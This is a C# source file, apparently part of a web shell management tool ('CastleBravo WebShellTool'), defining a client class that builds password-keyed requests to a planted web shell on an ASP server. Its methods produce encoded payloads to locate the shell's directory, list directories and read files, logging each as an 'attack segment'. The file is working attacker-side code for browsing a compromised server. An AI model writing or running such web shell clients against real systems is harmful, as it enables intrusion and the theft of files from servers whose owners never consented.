using C2.Core;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace C2.Business.CastleBravo.WebShellTool
{
    class ASPCustomClient : CommonClient
    {

        public ASPCustomClient(string password, string clientSetting)
            : base(password, clientSetting)
        {
            this.prefix = password + "=" + this.clientSetting.PHP_MAKE;
        }
        public override string PHPInfo()
        {
            string payload = "该功能暂不支持";
            sb.AppendLine(payload);

            return string.Empty;
        }

        public override string PHPIndex()
        {
            string payload = prefix.Replace("PAYLOAD", clientSetting.PHP_INDEX);

            sb.AppendLine("定位D洞所在目录:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INDEX)))
              .AppendLine();

            return payload;
        }

        public override string PHPReadDict(string dict)
        {
            string payload = String.Format("{0}&{1}={2}",
                                            prefix.Replace("PAYLOAD", clientSetting.PHP_READDICT),
                                            clientSetting.PARAM1,
                                            ST.StringToHex(dict));

            sb.AppendLine("遍历目录:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", payload))
              .AppendLine(string.Format("查询路径:{0}", ST.SuperDecodeBase64(dict)))
              .AppendLine();

            return payload;
        }

        public override string DetailInfo(string PageData)
        {
            string payload = String.Format("{0}&{1}={2}",
                                             prefix.Replace("PAYLOAD", clientSetting.PHP_READFILE),
                                             clientSetting.PARAM1,
                                             ST.StringToHex(PageData));

            sb.AppendLine("文件浏览:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", payload))
              .AppendLine(string.Format("参数一:{0}", ST.SuperDecodeBase64(PageData)))
              .AppendLine();

            return payload;
        }
    }
}
